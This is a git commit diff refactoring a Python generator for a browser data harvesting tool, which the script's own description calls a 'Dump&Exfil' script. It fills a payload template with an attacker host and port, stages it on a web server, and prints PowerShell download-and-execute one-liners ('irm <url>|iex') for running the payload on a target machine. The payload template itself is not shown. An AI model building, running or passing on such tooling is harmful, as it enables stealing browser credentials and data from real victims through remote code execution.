a404af646313d0da4e3c66b212109f0616f92477
0xSeve <0bseve@proton.me>
2026-05-02 19:07:03 +0000

    Refactored GBHS to be modular for future GSK CLI implementation

--- general_browser_harvest_script/generate_chromelevator_script.py
+++ general_browser_harvest_script/generate_chromelevator_script.py
@@ -32,6 +32,44 @@ def pull_ip() -> str:
 
 # Main
 
+def generate_payload(template=DEFAULT_TEMPLATE, host=pull_ip(), port="8000"):
+    if not os.path.isabs(template):
+        template = os.path.join(SCRIPT_DIR, template)
+
+    if not os.path.exists(template):
+        failed(f"Template does not exist: {template}")
+        sys.exit(1)
+
+    os.makedirs(DEPLOY_DIR, exist_ok=True)
+    info(f"Loading template ({template})")
+
+    deploy_script = (
+        load_script(template)
+        .replace("<HOST>", host)
+        .replace("<PORT>", port)
+    )
+
+    file_name = generate_outfile_name()
+    full_outpath = os.path.join(DEPLOY_DIR, file_name)
+
+    save_script(deploy_script, full_outpath)
+    success(f"Output saved at: {full_outpath}")
+
+    url = f"http://{host}:{port}/deploy/{file_name}"
+
+    execution_methods = {
+        0 : ("Direct execution of payload -> $ ", f"{BLUE}irm {url}|iex{RESET}"),
+        1 : ("Powershell execution -> $ ", f"{BLUE}powershell.exe -c 'irm {url}|iex'{RESET}"),
+    }
+
+    for index in range(0, len(execution_methods)):
+        success(f"{execution_methods[index][0]+execution_methods[index][1]}")
+
+    info("Done.")
+
+    return execution_methods, url
+
+
 def main() -> None:
     parser = argparse.ArgumentParser(
         description="Auto generate a simple quick Chromelavator Dump&Exfil script."
@@ -43,37 +81,7 @@ def main() -> None:
 
     args = parser.parse_args()
 
-    template_path = args.template
-    if not os.path.isabs(template_path):
-        template_path = os.path.join(SCRIPT_DIR, template_path)
-
-    if not os.path.exists(template_path):
-        failed(f"Template does not exist: {template_path}")
-        sys.exit(1)
-
-    os.makedirs(DEPLOY_DIR, exist_ok=True)
-
-    info(f"Loading template ({template_path})")
-
-    deploy_script = (
-        load_script(template_path)
-        .replace("<HOST>", args.host)
-        .replace("<PORT>", args.port)
-    )
-
-    file_name = generate_outfile_name()
-    full_outpath = os.path.join(DEPLOY_DIR, file_name)
-
-    save_script(deploy_script, full_outpath)
-    success(f"[+] Output saved at: {full_outpath}")
-
-    url = f"http://{args.host}:{args.port}/deploy/{file_name}"
-
-    success(f"[+] irm {url}|iex")
-    success(f"[+] powershell.exe -c 'irm {url}|iex'")
-
-    info("Done.")
+    generate_payload(args.template, args.host, args.port)
 
 if __name__ == '__main__':
     main()
-
